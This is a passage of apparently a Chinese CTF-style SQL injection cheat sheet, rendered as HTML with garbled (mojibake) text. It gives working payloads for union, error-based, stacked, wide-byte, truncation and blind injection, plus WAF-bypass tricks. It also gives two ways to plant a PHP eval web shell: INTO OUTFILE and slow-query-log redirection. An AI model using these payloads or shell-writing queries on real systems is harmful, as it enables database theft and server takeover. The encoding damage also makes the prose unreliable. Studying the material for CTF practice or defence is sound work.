<pre><code class="highlight sql"><span class="keyword">show</span> tables; <span class="operator">/</span><span class="operator">/</span>æ˜¾ç¤ºå½“å‰é€‰ä¸­çš„æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨å
<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">1</span>; <span class="operator">/</span><span class="operator">/</span>è·å–ç¬¬ä¸€è¡Œçš„æ•°æ®ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•å¾—åˆ°è¡¨ä¸­æ‰€æœ‰çš„å­—æ®µåï¼Œä¸ä¼šè¢«å¤§é‡æ•°æ®é¡¶èµ°
<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [è¡¨å]; #æŸ¥è¯¢æ•´è¡¨
<span class="keyword">select</span> [åˆ—å<span class="number">1</span>, åˆ—å<span class="number">2</span>,...] <span class="keyword">from</span> [åº“å.è¡¨å]; #æŒ‡å®šåˆ—æŸ¥è¯¢
<span class="keyword">select</span> [è¡¨è¾¾å¼<span class="number">1</span>, è¡¨è¾¾å¼<span class="number">2</span>,...] <span class="keyword">from</span> [åº“å.è¡¨å]; #æŸ¥è¯¢è¡¨è¾¾å¼å­—æ®µ
group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata
<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [è¡¨å] <span class="keyword">order</span> <span class="keyword">by</span> [æ’åºå­—æ®µ] #æ’åº
#æ¡ä»¶æŸ¥è¯¢<span class="keyword">Where</span>
(<span class="number">1</span>)æ¯”è¾ƒè¿ç®—ç¬¦ (<span class="number">2</span>)<span class="keyword">BETWEEN</span> ... <span class="keyword">AND</span> ... (<span class="number">3</span>)<span class="keyword">IN</span> (<span class="number">4</span>)<span class="keyword">IS</span> <span class="keyword">NULL</span> (<span class="number">5</span>)<span class="keyword">LIKE</span> (<span class="number">6</span>)<span class="keyword">AND</span> (<span class="number">7</span>)<span class="keyword">OR</span> 
(<span class="number">8</span>)<span class="keyword">NOT</span>
<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [è¡¨å] <span class="keyword">where</span> [æ¡ä»¶];</code></pre>

<ul>
<li><strong>æ’å…¥</strong></li>
</ul>
<pre><code class="highlight sql"><span class="keyword">insert</span> <span class="keyword">into</span> table_names (column1,column2,column3...)
<span class="keyword">insert</span> <span class="keyword">into</span> (table1,table2,table3) <span class="keyword">values</span> (value1,value2,value3) #æ›¿æ¢é”®å·²å­˜åœ¨çš„å€¼
<span class="keyword">on</span> duplicate key <span class="keyword">update</span> ()#ä¸ä¼šäº†ï¼Œç•™ä¸ªå‘å…ˆ(</code></pre>

<ul>
<li><strong>æ³¨é©¬</strong></li>
</ul>
<pre><code class="highlight sql"><span class="keyword">select</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">into</span> outfile&quot;D:\\phpstudy_pro\\WWW\\shell.php&quot;
<span class="number">2.</span>åˆ©ç”¨æ—¥å¿—æ–‡ä»¶å†™å…¥æœ¨é©¬
<span class="number">1.</span>å¼€å¯æ—¥å¿—åŠŸèƒ½

<span class="keyword">set</span> <span class="keyword">global</span> slow_query_log<span class="operator">=</span><span class="number">1</span>;
<span class="number">2.</span>è®¾ç½®æ—¥å¿—å­˜å‚¨è·¯å¾„

<span class="keyword">SET</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;D:\\phpstudy_pro\\WWW\\shell.php&#x27;</span>;
<span class="number">3.</span>æ‰§è¡Œ<span class="keyword">sql</span>è¯­å¥

<span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_GET[H])?&gt;&#x27;</span> <span class="keyword">or</span> SLEEP(<span class="number">11</span>);
</code></pre>



<h2 id="episode-2-åŸºç¡€æ³¨å…¥"><a href="#episode-2-åŸºç¡€æ³¨å…¥" class="headerlink" title="episode 2  åŸºç¡€æ³¨å…¥"></a>episode 2  åŸºç¡€æ³¨å…¥</h2><h3 id="unionæ³¨å…¥-1â€™"><a href="#unionæ³¨å…¥-1â€™" class="headerlink" title="unionæ³¨å…¥(-1â€™)"></a>unionæ³¨å…¥(-1â€™)</h3><p>unionæ³¨å…¥åŸæœ¬æ˜¯ç”¨äºåˆå¹¶å¤šæ¡selectæŸ¥è¯¢ç»“æœï¼›é€šè¿‡-1é€ æˆå‰é¢ä¸€æ¡æŸ¥è¯¢è¯­å¥è¿”å›ä¸ºç©ºï¼Œä»è€Œæ˜¾ç¤ºæˆ‘ä»¬æ³¨å…¥çš„æŸ¥è¯¢è¯­å¥ã€‚(å› ä¸ºç½‘é¡µåªèƒ½å¤Ÿæ˜¾ç¤ºä¸€æ¡æŸ¥è¯¢è®°å½•)</p>
<pre><code class="highlight sql">#<span class="number">1.</span>æŸ¥è¡¨åˆ—æ•°
<span class="number">-1</span>â€™<span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span><span class="operator">~</span><span class="number">4</span>;
#æŸ¥å®Œåä½¿ç”¨<span class="keyword">select</span> è¯­å¥
<span class="keyword">select</span> <span class="number">1</span>ï¼Œ<span class="number">2</span>ï¼Œ<span class="number">3</span>ï¼›
#æŸ¥åº“å
<span class="number">-1</span>â€™<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>ï¼Œdatabase()ï¼›
#æŸ¥è¡¨å
<span class="number">-1</span>â€™<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>â€™securityâ€™),<span class="number">3</span>#
#æŸ¥åˆ—å
<span class="number">-1</span>â€™<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>â€™securityâ€™ <span class="keyword">and</span> table_name<span class="operator">=</span>â€™emailsâ€™),<span class="number">3</span>#
#ç›´æ¥æŸ¥æ•°æ®
<span class="number">-1</span>â€™<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> email_id <span class="keyword">from</span> emails limit <span class="number">2</span>,<span class="number">1</span>),<span class="number">3</span>#

#å…¶å®è¿˜æ˜¯æ›´æ¨èurlcodeä¸€ä¸‹æ³¨é‡Šç¬¦å·é˜²æ­¢æ²¡æœ‰å›å¼¹(<span class="operator">%</span><span class="number">23</span>)</code></pre>

<p>é‚£åˆå­¦çš„å¸ˆå‚…å¯èƒ½å°±ä¼šä¸æ˜ç™½è¿™ä¸ª1ï¼Œ2ï¼Œ3æ˜¯ä»€ä¹ˆæ„æ€</p>
<p>è¿™ä¸ª1ï¼Œ2ï¼Œ3å®é™…æ˜¯å¯ä»¥å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿåˆ¤æ–­åˆ—æ•°çš„å·¥å…·(<del>order by:é‚£æˆ‘å‘¢ï¼Ÿ</del>)åŒæ—¶ï¼Œè¿™ä¸ª1ï¼Œ2ï¼Œ3æ— å…³é¡ºåºï¼Œåªè¦æ‰¾åˆ°å›æ˜¾ä½å¹¶ä¸”å·²ç»çˆ†å‡ºæ•°æ®è¡¨çš„æƒ…å†µä¸‹å°±å¯ä»¥åœ¨å›æ˜¾ä½å†™æ³¨å…¥è¯­å¥è¿›ä¸€æ­¥çˆ†</p>
<p>ä¹Ÿå¯ä»¥union all select ,è¿™æ—¶å‰é¢çš„-1å¯ä»¥å»æ‰</p>
<h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><p>1.extractvalueå‡½æ•°</p>
<p>æŸ¥è¯¢å¯¹è±¡xmlæŸä¸€ä¸ªæ ‡ç­¾çš„å€¼</p>
<p>å¦‚æœæŸ¥è¯¢çš„æ ‡ç­¾æ ¼å¼ä¸å¯¹ï¼Œå°±ä¼šæŠ¥é”™</p>
<p>åˆ©ç”¨concatå‡½æ•°æ¥é“¾æ¥ä¸¤ä¸ªå­—ç¬¦ä¸²</p>
<p>æŸ¥è¯¢æ•°æ®åº“ï¼šâ€™ and extractvalue(â€˜divâ€™,concat(â€˜~â€™,database()))#</p>
<pre><code class="highlight sql"><span class="number">-1</span><span class="string">&#x27; and(select extractive(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,database())))#</span></code></pre>

<p>-&gt;æŸ¥è¯¢divï¼Œ~å­˜åœ¨ä¼šæŠ¥é”™</p>
<p>çˆ†å‡º~databaseï¼ˆï¼‰</p>
<p>2.updatexml</p>
<p>æ›´æ–°xmlæ–‡æ¡£å†…å®¹</p>
<p>è¯­æ³•ï¼šupdatexml(â€˜xmlåâ€™ï¼Œâ€™è·¯å¾„åâ€™ï¼Œæ›´æ–°å€¼)ï¼›</p>
<p>åŒæ ·é“ç†ï¼Œå½“æ²¡æœ‰å¯¹åº”è·¯å¾„çš„æ—¶å€™ä¼šæŠ¥é”™</p>
<pre><code class="highlight plaintext">&#x27; and updatexml(&#x27;div&#x27;, concat(&#x27;~&#x27;,database()),&#x27;hi&#x27;)#
&#x27; union select 1,(extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata))))--+
</code></pre>

<p>å…¶ä»–åŒä¸Š</p>
<h3 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥(!)"></a>å †å æ³¨å…¥(!)</h3><p>åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š1; DELETE FROM productsæœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼š Select * from products where productid&#x3D;1;DELETE FROM productså½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤ã€‚</p>
<pre><code class="highlight plaintext">å †å æ³¨å…¥ä¸­å¥‡æ€ªçš„çŸ¥è¯†ç‚¹
1.è¾“å…¥æ•°å­—æœ‰å›æ˜¾è€Œå­—ç¬¦æ²¡æœ‰å›æ˜¾ï¼Œè¯´æ˜äº†è¯­å¥ä¸­å­˜åœ¨||ç»“æ„ (åœ¨sqlä¸­è¡¨ç¤ºè¿æ¥ç¬¦å·)
è®¾ç½® sql_mode=PIPES_AS_CONCATæ¥è½¬æ¢æ“ä½œç¬¦çš„ä½œç”¨ã€‚ï¼ˆsql_modeè®¾ç½®ï¼‰ åˆ©ç”¨PIPES_AS_CONCATä»¤||èµ·åˆ°è¿æ¥ç¬¦çš„ä½œç”¨ã€‚
</code></pre>

<h3 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h3><p>åœ¨æ­£å¸¸æ³¨å†Œ(å‡è®¾è´¦æˆ·åä¸ºadmin)åç™»å½•ï¼Œå°è¯•ä¿®æ”¹å¯†ç ï¼Œä½¿ç”¨adminâ€™#è¿™ä¸ªç”¨æˆ·åä¿®æ”¹å´å‘ç°æˆåŠŸä¿®æ”¹äº†adminçš„å¯†ç ï¼Œè¿™å°±è¯´æ˜å­˜åœ¨äºŒæ¬¡æ³¨å…¥çš„æ¼æ´äº†</p>
<pre><code class="highlight plaintext">äºŒæ¬¡æ³¨å…¥ï¼Œå®é™…ä¸Šå°±æ˜¯åœ¨æ³¨å…¥æ•°æ®ä¹‹åï¼Œåˆ©ç”¨ç³»ç»ŸæŸ¥è¯¢æ•°æ®çš„ç”¨è„æ•°æ®è¿›è¡Œç¬¬äºŒæ¬¡çš„æ”»å‡»ï¼Œä»è€Œè¾¾åˆ°å…¥ä¾µæ•°æ®åº“çš„ç›®çš„</code></pre>

<h3 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a><strong>åŸç†</strong></h4><p>ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœå¼€å‘äººå‘˜åœ¨å¼€å‘çš„æ—¶å€™ï¼Œå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†ç‰¹æ®Šçš„å‡½æ•°å¤„ç†ï¼Œæ¯”å¦‚ä½¿ç”¨äº†trim()å‡½æ•°ï¼Œhtmlspecialchars()å‡½æ•°ï¼Œaddlasheså‡½æ•°ï¼Œæ˜¯å¯ä»¥è¿‡æ»¤æˆ‘ä»¬éæ³•æäº¤çš„å‚æ•°ï¼Œä»è€Œå¯¼è‡´SQLæ³¨å…¥æ— æ³•æˆåŠŸã€‚</p>
<p>ä½œä¸ºæ”»å‡»è€…ï¼Œè¦å®Œæˆçš„æ˜¯å¯¹å‚æ•°çš„æ‹¼æ¥ï¼Œä»è€Œå¯¼è‡´æ¶æ„çš„SQLè¯­å¥å†™å…¥ã€‚ä½œä¸ºå¼€å‘è€…è¦å®Œæˆçš„æ˜¯SQLè¾“å‡ºå‚æ•°çš„ä¸€ä¸ªè¿‡æ»¤æ¯”å¦‚å¯¹æ¶æ„çš„å­—ç¬¦è¿›è¡Œè½¬ç§»</p>
<h4 id="å¸¸ç”¨è¿‡æ»¤å‡½æ•°"><a href="#å¸¸ç”¨è¿‡æ»¤å‡½æ•°" class="headerlink" title="å¸¸ç”¨è¿‡æ»¤å‡½æ•°"></a><strong>å¸¸ç”¨è¿‡æ»¤å‡½æ•°</strong></h4><p><strong>trim()å‡½æ•°</strong><br>ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦<br><strong>htmlspecialchars()å‡½æ•°</strong><br>æŠŠé¢„å®šä¹‰çš„å­—ç¬¦â€&lt;â€å’Œâ€&gt;â€è½¬æ¢ä¸ºHTMLå®ä½“ï¼Œé¢„é˜²XSS<br><strong>addslashes()å‡½æ•°</strong><br>è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²</p>
<pre><code class="highlight sql"># é¢„å®šä¹‰å­—ç¬¦
<span class="number">1.</span>å•å¼•å·(<span class="string">&#x27;)</span>
<span class="string">2.åŒå¼•å·(&quot;)</span>
<span class="string">3.åæ–œæ (\)</span>
<span class="string">4.NULL</span></code></pre>

<p>ä¸Šè¿°å‡½æ•°å¸¸åœ¨CMSé‡Œä½¿ç”¨è¿›è¡Œè¿‡æ»¤</p>
<h4 id="å®½å­—èŠ‚æ³¨å…¥æ¡ä»¶"><a href="#å®½å­—èŠ‚æ³¨å…¥æ¡ä»¶" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥æ¡ä»¶"></a><strong>å®½å­—èŠ‚æ³¨å…¥æ¡ä»¶</strong></h4><p>1.æ•°æ®åº“ä¸ºGBKç¼–ç <br>2.ä½¿ç”¨äº†è½¬ä¹‰å‡½æ•°ï¼Œå°†ã€POGETSTã€cookieä¼ é€’çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå°†å•å¼•å·ã€åŒå¼•å·ã€nullç­‰æ•æ„Ÿå­—ç¬¦ç”¨è½¬ä¹‰ç¬¦ \ è¿›è¡Œè½¬ä¹‰</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><pre><code class="highlight plaintext">root %df&#x27; or 1=1 #
# åŸç†:åœ¨GBKç¼–ç ä¸­,åæ–œæ çš„ç¼–ç æ˜¯%5c,åœ¨è¾“å…¥%dfåï¼Œä½¿å¾—æ·»åŠ åæ–œæ åå½¢æˆ%df%5cï¼Œè€Œ%df%5cæ˜¯ç¹ä½“å­—â€œé€£â€ï¼Œå•å¼•å·æˆåŠŸé€ƒé€¸ï¼Œçˆ†å‡ºMysqlæ•°æ®åº“çš„é”™è¯¯</code></pre>



<h3 id="çº¦æŸæ”»å‡»"><a href="#çº¦æŸæ”»å‡»" class="headerlink" title="çº¦æŸæ”»å‡»"></a>çº¦æŸæ”»å‡»</h3><p>åœ¨SQLæ‰§è¡Œå­—ç¬¦ä¸²å¤„ç†æ“ä½œæ—¶ï¼Œå­—ç¬¦ä¸²æœ«å°¾çš„ç©ºæ ¼ç¬¦å°†ä¼šè¢«åˆ é™¤ï¼Œæ¢å¥è¯è¯´â€userâ€æ˜¯ç­‰åŒäºâ€user     â€œçš„ï¼Œå¯¹äºç»å¤§å¤šæ•°çš„æƒ…å†µè¿™ä¸¤ä¸ªç›¸ç­‰éƒ½æ˜¯æˆç«‹çš„(åƒWHEREå­å¥çš„å­—ç¬¦ä¸²å’ŒINSERTè¯­å¥ä¸­çš„å­—ç¬¦ä¸²)</p>
<blockquote>
<p>[!WARNING]</p>
<p>ä½†æ˜¯åœ¨åƒLIKE å­å¥ä¸­è¿™æ˜¯ä¸æˆç«‹çš„ã€‚å› ä¸ºå¯¹å°¾éƒ¨ç©ºç™½ç¬¦çš„è¿™ç§ä¿®å‰ªæ“ä½œï¼Œä¸»è¦æ˜¯åœ¨â€œå­—ç¬¦ä¸²æ¯”è¾ƒâ€æœŸé—´è¿›è¡Œçš„ã€‚è¿™æ˜¯å› ä¸ºï¼ŒSQLä¼šåœ¨<a href="https://support.microsoft.com/en-in/kb/316626">å†…éƒ¨</a>ä½¿ç”¨ç©ºæ ¼æ¥å¡«å……å­—ç¬¦ä¸²ï¼Œä»¥ä¾¿åœ¨æ¯”è¾ƒä¹‹å‰ä½¿å…¶å®ƒä»¬çš„é•¿åº¦ä¿æŒä¸€è‡´</p>
</blockquote>
<p>åœ¨æ‰€æœ‰çš„INSERTæŸ¥è¯¢ä¸­ï¼ŒSQLéƒ½ä¼šæ ¹æ®varchar(n)æ¥é™åˆ¶å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœå­—ç¬¦ä¸²çš„é•¿åº¦å¤§äºâ€œnâ€ä¸ªå­—ç¬¦çš„è¯ï¼Œé‚£ä¹ˆä»…ä½¿ç”¨å­—ç¬¦ä¸²çš„å‰â€œnâ€ä¸ªå­—ç¬¦ã€‚æ¯”å¦‚ç‰¹å®šåˆ—çš„é•¿åº¦çº¦æŸä¸ºâ€œ5â€ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆåœ¨æ’å…¥å­—ç¬¦ä¸²â€œvampireâ€æ—¶ï¼Œå®é™…ä¸Šåªèƒ½æ’å…¥å­—ç¬¦ä¸²çš„å‰5ä¸ªå­—ç¬¦ï¼Œå³â€œvampiâ€</p>
<p><strong>æ”»å‡»æ‰‹æ®µ</strong></p>
<p>æ³¨å†Œä¸€ä¸ªç”¨æˆ·å+ä¸€å †æ‹¬å·+1çš„ç”¨æˆ·åå’Œè‡ªå·±çš„passwd(æœªè¶…å‡ºé•¿åº¦é™åˆ¶çš„å­—ç¬¦åº”è¯¥åªåŒ…å«å·²çŸ¥çš„ç”¨æˆ·åå’Œç©ºç™½å­—ç¬¦)</p>
<p>æ³¨:åœ¨æŸ¥è¯¢æ—¶ï¼ŒSQLæ˜¯ä¸ä¼šå°†å­—ç¬¦ä¸²æˆªæ–­çš„ã€‚å› æ­¤ï¼Œä½¿ç”¨å®Œæ•´çš„å­—ç¬¦ä¸²è¿›è¡Œæœç´¢ï¼Œæ‰€ä»¥ä¸ä¼šæ‰¾åˆ°åŒ¹é…çš„ç»“æœã€‚ä½†å½“æ‰§è¡ŒINSERTæŸ¥è¯¢è¯­å¥æ—¶ï¼Œå®ƒåªä¼šæ’å…¥è¢«é™åˆ¶é•¿åº¦çš„å­—ç¬¦ã€‚</p>
<p>åœ¨æ”»å‡»ç»“æŸåï¼Œè¾“å…¥åæ¥æˆ‘ä»¬è‡ªå·±çš„å¯†ç å’Œå·²ç»™çš„ç”¨æˆ·åï¼Œä¼šç™»å½•ä¸ŠåŸå§‹ç”¨æˆ·</p>
<pre><code class="highlight plaintext">è§£å†³åŠæ³•:
å°†è¦æ±‚æˆ–è€…é¢„æœŸå…·æœ‰å”¯ä¸€æ€§çš„é‚£äº›åˆ—åŠ ä¸ŠUNIQUEçº¦æŸã€‚å®é™…ä¸Šè¿™æ˜¯ä¸€ä¸ªæ¶‰åŠè½¯ä»¶å¼€å‘çš„é‡è¦è§„åˆ™ï¼Œå³ä½¿ä½ çš„ä»£ç æœ‰ç»´æŒå…¶å®Œæ•´æ€§çš„åŠŸèƒ½ï¼Œä¹Ÿåº”è¯¥æ°å½“çš„å®šä¹‰æ•°æ®ã€‚ç”±äºâ€™usernameâ€™åˆ—å…·æœ‰UNIQUEçº¦æŸï¼Œæ‰€ä»¥ä¸èƒ½æ’å…¥å¦ä¸€æ¡è®°å½•ã€‚å°†ä¼šæ£€æµ‹åˆ°ä¸¤ä¸ªç›¸åŒçš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”INSERTæŸ¥è¯¢å°†å¤±è´¥ã€‚

æœ€å¥½ä½¿ç”¨â€™idâ€™ä½œä¸ºæ•°æ®åº“è¡¨çš„ä¸»é”®ã€‚å¹¶ä¸”æ•°æ®åº”è¯¥é€šè¿‡ç¨‹åºä¸­çš„idè¿›è¡Œè·Ÿè¸ª

ä¸ºäº†æ›´åŠ å®‰å…¨ï¼Œè¿˜å¯ä»¥ç”¨æ‰‹åŠ¨è°ƒæ•´è¾“å…¥å‚æ•°çš„é™åˆ¶é•¿åº¦ï¼ˆä¾ç…§æ•°æ®åº“è®¾ç½®ï¼‰</code></pre>

<h3 id="Order-byæ³¨å…¥"><a href="#Order-byæ³¨å…¥" class="headerlink" title="Order byæ³¨å…¥"></a>Order byæ³¨å…¥</h3><h3 id="å¼‚æˆ–æ³¨å…¥"><a href="#å¼‚æˆ–æ³¨å…¥" class="headerlink" title="å¼‚æˆ–æ³¨å…¥"></a>å¼‚æˆ–æ³¨å…¥</h3><p>ä¸€èˆ¬å’Œç›²æ³¨ä¸€èµ·ä»å‡ºç°ï¼ŒåŸå› æ˜¯å¤§éƒ¨åˆ†åŸºç¡€çš„æŸ¥è¯¢å·²ç»è¢«banäº†(æ‚²)</p>
<p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œå³Mysqlçš„éšå¼è½¬æ¢ï¼Œå…¶å®å’ŒPHPæ¯”è¾ƒç›¸åƒå§</p>
<pre><code class="highlight plaintext">Mysqlçš„éšå¼è½¬æ¢
å½“å­—ç¬¦ä¸²å’Œæ•°å­—è¿›è¡Œç®—æœ¯è®¡ç®—æ—¶ï¼Œå­—ç¬¦ä¸²ä¼šè¢«å°è¯•è½¬åŒ–ä¸ºæ•°å­—(å¦‚æœå¯èƒ½)
ä¾‹å¦‚&#x27;1&#x27;+1 ä¼šè¢«è§£é‡Šä¸º1+1
è‹¥ä¸èƒ½æˆåŠŸè½¬åŒ–(å³å­—ç¬¦ä¸²çš„é¦–ä½ä¸ä¸ºæ•°å­—),å­—ç¬¦ä¸²å°±ä¼šè¢«è§£é‡Šä¸º0</code></pre>

<p>æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å¼‚æˆ–å¼æ¥è¾…åŠ©ç›²æ³¨(åˆ¤æ–­boolç›²æ³¨çš„è¯­å¥è¿”å›ç»“æœæ˜¯å¦ä¸ºçœŸ,å¸®åŠ©åŠ é•¿æ—¶é—´ç›²æ³¨çš„è¿ç®—æ—¶é—´)</p>
<h2 id="Episode-3-åœ¨æ‹¿åˆ°flagçš„è¾¹ç¼˜ç–¯ç‹‚è¯•æ¢-ç›²æ³¨"><a href="#Episode-3-åœ¨æ‹¿åˆ°flagçš„è¾¹ç¼˜ç–¯ç‹‚è¯•æ¢-ç›²æ³¨" class="headerlink" title="Episode 3 åœ¨æ‹¿åˆ°flagçš„è¾¹ç¼˜ç–¯ç‹‚è¯•æ¢:ç›²æ³¨"></a>Episode 3 åœ¨æ‹¿åˆ°flagçš„è¾¹ç¼˜ç–¯ç‹‚è¯•æ¢:ç›²æ³¨</h2><p>(å“ˆå“ˆï¼Œç›²æ³¨è„šæœ¬å—ï¼Œä½ é—®æˆ‘ï¼Œæˆ‘åªèƒ½è¯´æœ€å¥½è‡ªå·±å†™ä¸€ä¸ªï¼Œç½‘ä¸Šæ·˜æ¥çš„æ¯•ç«Ÿæ˜¯åˆ«äººçš„ä¸å¦‚ä½ è‡ªå·±æ“çš„é¡ºæ‰‹)</p>
<p>å…ˆç¡®å®šæ³¨å…¥å‹ï¼Œå†ç”¨andè¿æ¥ä¸€ä¸‹</p>
<pre><code class="highlight sql">å¸ƒå°”ç›²æ³¨
<span class="number">1.</span> length(database())<span class="operator">&gt;</span>??? åˆæ­¥åˆ¤æ–­
<span class="number">2.</span></code></pre>

<h2 id="Episode-4-æ³¨å…¥ç‚¹-çŒœçŒœæˆ‘åœ¨å“ªé‡Œå‘¢"><a href="#Episode-4-æ³¨å…¥ç‚¹-çŒœçŒœæˆ‘åœ¨å“ªé‡Œå‘¢" class="headerlink" title="Episode 4 æ³¨å…¥ç‚¹:&gt;çŒœçŒœæˆ‘åœ¨å“ªé‡Œå‘¢"></a>Episode 4 æ³¨å…¥ç‚¹:&gt;çŒœçŒœæˆ‘åœ¨å“ªé‡Œå‘¢</h2><h3 id="POSTæ³¨å…¥"><a href="#POSTæ³¨å…¥" class="headerlink" title="POSTæ³¨å…¥"></a>POSTæ³¨å…¥</h3><h3 id="GETæ³¨å…¥"><a href="#GETæ³¨å…¥" class="headerlink" title="GETæ³¨å…¥"></a>GETæ³¨å…¥</h3><h3 id="Cookiesæ³¨å…¥"><a href="#Cookiesæ³¨å…¥" class="headerlink" title="Cookiesæ³¨å…¥"></a>Cookiesæ³¨å…¥</h3><h2 id="Episode-5-ä½ å¥½ï¼Œç»•WAF"><a href="#Episode-5-ä½ å¥½ï¼Œç»•WAF" class="headerlink" title="Episode   5  ä½ å¥½ï¼Œç»•WAF"></a>Episode   5  ä½ å¥½ï¼Œç»•WAF</h2><h3 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h3><p>å¦‚è¿‡è¿‡æ»¤äº†andå’ŒANDï¼Œè¯•è¯•And</p>
<h3 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a>åŒå†™ç»•è¿‡</h3><p>å¦‚æœwafæŠŠandæ›¿æ¢ä¸ºç©º</p>
<p>ç„¶åå¯ä»¥ä½¿ç”¨<code>anandd</code>ç»•è¿‡</p>
<h3 id="ç©ºæ ¼è¿‡æ»¤ç»•è¿‡"><a href="#ç©ºæ ¼è¿‡æ»¤ç»•è¿‡" class="headerlink" title="ç©ºæ ¼è¿‡æ»¤ç»•è¿‡"></a>ç©ºæ ¼è¿‡æ»¤ç»•è¿‡</h3><p>&#x2F;**&#x2F;  æ³¨é‡Šç¬¦å·</p>
<pre><code class="highlight plaintext">()-&gt;select(1),2,3</code></pre>

